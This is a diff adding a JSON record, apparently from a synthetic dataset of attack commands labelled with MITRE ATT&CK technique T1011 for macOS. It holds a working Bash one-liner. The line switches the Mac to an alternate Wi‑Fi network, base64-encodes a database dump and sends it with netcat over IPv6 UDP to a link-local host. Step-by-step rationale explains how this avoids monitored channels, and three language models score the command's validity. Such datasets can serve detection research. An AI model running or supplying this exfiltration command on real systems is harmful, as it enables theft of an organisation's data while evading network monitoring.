@@ -1,0 +1,59 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "sudo /System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport -z && networksetup -setairportnetwork en0 \"field_ops_149\" \"kHz149-pass\" && base64 < /Users/Shared/exports/db.dump | nc -6u fe80::7a8b:9c0d:1e2f:3a4b%en0 53317 -w 2",
+  "explanation": "Uses an alternate Wi‑Fi SSID to exfiltrate a database dump via IPv6 UDP to a high, uncommon port, reducing overlap with typical monitored services. This leverages a different network medium than the primary channel, consistent with T1011.",
+  "rationale_steps": [
+    "Drop any existing Wi‑Fi association.",
+    "Join a non-corporate SSID on a less common 5 GHz channel.",
+    "Base64-encode the dump to make payload less obvious in transit.",
+    "Transmit via IPv6 UDP on a high port scoped to the Wi‑Fi interface."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-0b4a25ae-0762cc79",
+  "source_prompt_hash": "0b4a25ae",
+  "timestamp_utc": "2025-09-30T08:33:07.947625Z",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Balanced quoting and operators with valid flags for airport, networksetup, base64, and BSD nc, and proper IPv6 link-local scope syntax make it well-formed.",
+        "semantic_score": 3,
+        "semantic_justification": "It plausibly exfiltrates data via base64 piped to UDP over an alternate Wi‑Fi, but lacks true automation (scheduling/retry) per the stated technique and may fail without sudo for networksetup or if en0 is not the Wi‑Fi interface.",
+        "combined_score": 4.0,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T04:00:38.011714Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper command separators (&&), balanced quotes, valid flags, and correct syntax for all three operations (airport disconnect, network setup, and data exfiltration).",
+        "semantic_score": 5,
+        "semantic_justification": "The command fully implements the T1011 technique by first switching to an alternate network, then exfiltrating a database dump via base64 encoding and netcat over IPv6 UDP to a specific port, demonstrating automated exfiltration with proper data preparation and transfer.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T05:55:16.902299Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, using valid flags, correct command separators, and balanced quotes for all components on a macOS platform.",
+        "semantic_score": 2,
+        "semantic_justification": "The command is semantically flawed because `networksetup -setairportnetwork` typically requires root privileges on macOS, and it is not prefixed with `sudo` in the provided command chain, meaning it will likely fail under the specified 'Privilege: None' context and prevent the claimed alternate Wi-Fi exfiltration.",
+        "combined_score": 3.5,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T05:55:36.967606Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 3.333,
+    "llm_average_score": 4.167,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": ""
+  }
+}
